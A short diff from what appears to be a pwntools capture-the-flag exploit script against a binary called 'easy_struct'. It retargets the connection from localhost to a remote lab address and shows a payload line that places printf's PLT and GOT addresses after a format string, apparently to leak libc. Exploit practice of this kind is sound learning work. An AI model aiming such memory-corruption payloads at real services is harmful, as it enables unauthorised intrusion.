@@ -2,7 +2,7 @@ from pwn import *
 
 elf=ELF('./easy_struct')
 # p=process('./easy_struct')
-p=remote('127.0.0.1',9996)
+p=remote('10.10.175.204',9996)
 libc=ELF('./libc.so.6')
 p.recv()
 payload=b'%s\n'.ljust(16,b'\x00')+p64(elf.plt['printf'])+p64(elf.got['printf'])
